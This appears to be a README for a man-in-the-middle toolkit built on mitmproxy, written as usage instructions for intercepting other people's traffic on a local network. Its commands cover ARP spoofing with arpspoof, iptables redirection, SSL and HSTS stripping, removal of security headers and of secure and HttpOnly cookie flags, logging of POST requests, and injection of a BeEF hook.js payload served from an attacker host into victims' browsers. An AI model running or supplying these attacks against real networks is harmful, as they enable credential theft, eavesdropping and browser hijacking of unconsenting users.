MITM ATTACK WITH HTTP PROXYING ([MITMPROXY](http://docs.mitmproxy.org/en/stable/) v1.0)
----------
  
You can run  **mitm.sh**:  
```bash
Usage: ./mitm.sh [-g] [-n] [-s] [-x] [-j] <js payload url> [-i] <interface> ip_target1 ip_target2
       [-g] interactive mode for mitmproxy
       [-n] capture HTTP traffic
       [-s] capture HTTPS traffic
       [-x] stripping https
       [-j] inject js payload
       [-i] interface
```  
**/!\ Working with Mitmproxy v1.0. Mitmproxy will be automatically downloaded and installed.**  
  
Example of command for full interception (HTTPS/HSTS stripping when possible, otherwise Upstream Certificates):  
  
```
sudo ./mitm.sh -g -n -s -x -i wlan0 192.168.1.1 192.168.1.11
```
  
You also can inject a javascript payload (for example Beef payload):  
```
sudo ./mitm.sh -g -n -j http://192.168.1.10:3000/hook.js -i wlan0 192.168.1.1 192.168.1.11
```
  
While stripping SSL/TLS (*sslstrip.py*), we also aims at:
 - Dropping the following request headers: *If-Modified-Since*,*Cache-Control*,*Upgrade-Insecure-Requests*
 - Dropping the following response headers: *Strict-Transport-Security*,*Public-Key-Pins*,*Content-Security-Policy*,*X-XSS-Protection*,*X-Frame-Options*
 - Dropping meta tag *Content-Security-Policy*
 - Dropping cookies flags *secure*, *HttpOnly*
 - Stripping https:// links and redirections
  
___
  
**mitm.sh** is automating the following steps:  

 - activate ip forwarding (all secured connections will be routed without interception):  
```bash
sysctl -w net.ipv4.ip_forward=1
```

 - avoid to send useless ICMP redirect messages
```bash
echo 0 | sudo tee /proc/sys/net/ipv4/conf/*/send_redirects
```

 - configure nat (8080 is the default listening port of mitmproxy):  
```bash
iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 80 -j REDIRECT --to-port 8080
```  
 - and if you want to add HTTPS capture:
```bash
iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 443 -j REDIRECT --to-port 8080
```  
*The REDIRECT target is used to redirect packets and streams to the machine itself. This means that we could for example REDIRECT all packets destined for the HTTP ports to an HTTP proxy (useful for transparent proxying).*  

 - run arp spoofing with calling the script **arpoison.sh**:  
```bash
xterm -geometry 100x25+1+200 -hold -e arpspoof -t [ip victim] [ip route]
xterm -geometry 100x25+1+300 -hold -e arpspoof -t [ip route] [ip victim]
```
*N.B: arpoison.sh can try to force the arp poisoning of some boxes*  

 - check if arp poisoning is working on both ways with **chk_poison.py**:  
```bash
python ./chk_poison.py [ip victim] [ip route]
```

 - run mitmproxy with our custom **sslstrip.py** module, the **injectjs.py** module and the **io_write_dumpfile.py** module. io_write_dumpfile.py is logging only relevant POST requests (if you want to log trafic, **-a \<logfilename\>**):  
```bash
mitmproxy -T --anticache --host --anticomp --noapp --script "./io_write_dumpfile.py ./requests.log" --script ./sslstrip.py --eventlog
```  
  
*N.B: mitmproxy (with option -w/-a for logging) will dump the whole flows in a tnetstrings format.*  
  
You can also run mitmdump (same as mitmproxy but non interactive):  
```bash
mitmdump -T --anticache --host --anticomp --noapp --quiet --script "./io_write_dumpfile.py ./requests.log" --script ./sslstrip.py"
```
 
 - if you want to extra log urls in a file:   
```bash
urlsnarf > ./urlsnarf.txt &
```
  
**Now go on a website with an unsecured (http) landing webpage and try to click on a link forwarding to a secure area. All trafic should stay clear between the victim and mitmproxy.  
If you injected a Beef hook thanks to the -j option, also check the browser hooked in your Beef panel.**  
  
**Don't hesitate to contribute to all of these modules.**


